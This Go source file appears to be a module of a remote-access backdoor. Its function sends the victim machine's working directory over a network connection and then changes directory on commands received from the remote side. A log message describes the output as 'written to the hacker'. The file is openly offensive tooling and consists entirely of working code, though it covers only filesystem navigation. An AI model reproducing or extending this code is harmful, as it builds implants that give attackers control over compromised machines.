package Move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func NavigateFilesystem(connection net.Conn) (err error) {
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println("[-] Can't get present working directory")
	}
	fmt.Println(pwd)

	pwd_raw := pwd + "\n"

	nbyte, err := connection.Write([]byte(pwd_raw))
	fmt.Println("[+] ", nbyte, " was written")

	CommandReader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {
		user_command_raw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println("[+] Unable to read command ")
		}

		if user_command_raw == "stop\n" {
			loopControl = false
			break
		}

		user_command := strings.TrimSuffix(user_command_raw, "\n")

		user_command_arr := strings.Split(user_command, " ")

		if len(user_command_arr) > 1 {
			dir2move := user_command_arr[1]
			err := os.Chdir(dir2move)
			if err != nil {
				fmt.Println("[-] Unable to change directory")
			}
		}

		pwd, err = os.Getwd()

		nbytes, err := connection.Write([]byte(pwd + "\n"))
		fmt.Println("[+] Pwd written to the hacker, ", nbytes)
	}

	return
}
